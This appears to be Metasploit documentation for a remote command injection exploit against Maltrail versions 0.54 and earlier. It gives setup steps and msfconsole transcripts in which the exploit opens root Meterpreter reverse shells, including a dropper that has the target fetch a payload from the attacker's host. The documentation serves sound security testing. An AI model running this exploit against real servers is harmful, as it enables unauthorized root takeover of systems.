## Vulnerable Application

Maltrail is a malicious traffic detection system, utilizing publicly
available blacklists containing malicious and/or generally suspicious trails.
The Maltrail versions <= 0.54 is suffering from a command injection vulnerability.
The `subprocess.check_output` function in `mailtrail/core/http.py` contains
a command injection vulnerability in the `params.get("username")` parameter.
An attacker can exploit this vulnerability by injecting arbitrary OS commands
into the username parameter. The injected commands will be executed with the
privileges of the running process. This vulnerability can be exploited remotely
without authentication.

This issue was discovered and reported by Chris Wild @briskets.
Check [here](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) for the original report.

## Testing
For installing the vulnerable version follow the steps below,
1. Follow the manual installation steps given [here](https://github.com/stamparm/maltrail/tree/0.53#quick-start)
2. After cloning the git project, simply do `git checkout 0.53` and proceed with the rest of the steps.

After these steps the Maltrail web interface will be exposed on the `http://<target>:8338/`.

## Verification Steps

1. msfconsole
2. Do: `use exploit/unix/http/maltrail_rce`
3. Do: `set RHOST [IP]`
3. Do: `set LHOST [IP]`
4. Do: `run`

## Options

## Scenarios

```
msf6 > use exploit/unix/http/maltrail_rce 
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/http/maltrail_rce) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/http/maltrail_rce) > set lhost 172.17.0.1
lhost => 172.17.0.1
msf6 exploit(unix/http/maltrail_rce) > run

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.52
[*] Executing Unix Command...
[*] Sending stage (24772 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:42250) at 2023-08-10 22:31:03 +0200

meterpreter > sysinfo 
Computer     : bab669395cfe
OS           : Linux 6.4.7-hardened1-2-hardened #1 SMP PREEMPT_DYNAMIC Wed, 02 Aug 2023 11:05:52 +0000
Architecture : x64
Meterpreter  : python/linux
meterpreter > getuid 
Server username: root
meterpreter > 
```

```
msf6 > use exploit/unix/http/maltrail_rce 
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/http/maltrail_rce) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/http/maltrail_rce) > set lhost 172.17.0.1
lhost => 172.17.0.1
msf6 exploit(unix/http/maltrail_rce) > run

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.52
[*] Executing Linux Dropper...
[*] Using URL: http://172.17.0.1:8080/Y9BtoN1
[*] Client 172.17.0.2 (Wget/1.21.2) requested /Y9BtoN1
[*] Sending payload to 172.17.0.2 (Wget/1.21.2)
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 2 opened (172.17.0.1:4444 -> 172.17.0.2:48664) at 2023-08-10 22:33:27 +0200
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

meterpreter > sysinfo 
Computer     : 172.17.0.2
OS           : Ubuntu 22.04 (Linux 6.4.7-hardened1-2-hardened)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid 
Server username: root
meterpreter > 

```
